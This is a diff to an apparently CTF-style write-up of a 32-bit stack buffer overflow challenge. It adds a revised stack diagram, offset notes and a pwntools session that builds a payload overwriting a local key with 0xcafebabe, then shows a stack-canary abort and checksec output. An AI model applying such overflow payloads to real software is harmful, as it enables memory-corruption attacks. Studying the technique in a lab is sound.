@@ -170,25 +170,67 @@ Found at offset 44
 ### Stack
 
 ```
-<==: Value is stored at that location
+<==: Value is stored at the address
 <--: Points to the address
 
-+---------------+ 
-|  61 61 61 61  | <== buffer (32 bytes) <-- esp
-|  62 61 61 61  | 
-|  63 61 61 61  |
-|  64 61 61 61  |
-|  65 61 61 61  |
-|  66 61 61 61  |
-|  67 61 61 61  |
-|  68 61 61 61  |
-+---------------+
-|  69 61 61 61  | <== stored ebp <-- ebp
-+---------------+
-|  70 61 61 61  | <== return address
-+---------------+
+                       +---------------+ 
+   esp --> buffer ==>  |  61 61 61 61  |
+                       |  62 61 61 61  | 
+                       |  63 61 61 61  |
+                       |  64 61 61 61  |
+                       |  65 61 61 61  |
+                       |  66 61 61 61  |
+                       |  67 61 61 61  |
+                       |  68 61 61 61  |
+                       |  69 61 61 61  |
+                       |  6A 61 61 61  |
+                       |  6B 61 61 61  |
+                       +---------------+
+ebp --> stored ebp ==> |  6C 61 61 61  | 
+                       +---------------+
+    return address ==> |  6D 61 61 61  | 
+                       +---------------+
+               key ==> |  EF BE AD DE  |
+                       +---------------+
+```
+
+### Exploit requirements
+
+We have all the information we need to create an exploit.
+	- [x] Value of `key` to overwrite: `0xcafebabe`
+	- [x] Distance between the buffer and `key`: `52`
+
+
+```python
+bof@ubuntu:~$ python
+Python 3.10.12 (main, Feb  4 2025, 14:57:36) [GCC 11.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *
+>>> payload = b"A" * 52
+>>> payload += p32(0xcafebabe)
+>>> print(payload)
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca'
 ```
 
 ```
-python3 -c 'print("A"*52 + "\xbe\xba\xfe\xca")' | ./bof
+bof@ubuntu:~$ ./bof
+overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca
+
+Nah..
+*** stack smashing detected ***: terminated
+Aborted (core dumped)
+```
+
+It seems like there is a stack canary,
+
+```
+bof@ubuntu:~$ checksec ./bof
+[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine
+[*] '/home/bof/bof'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
 ```
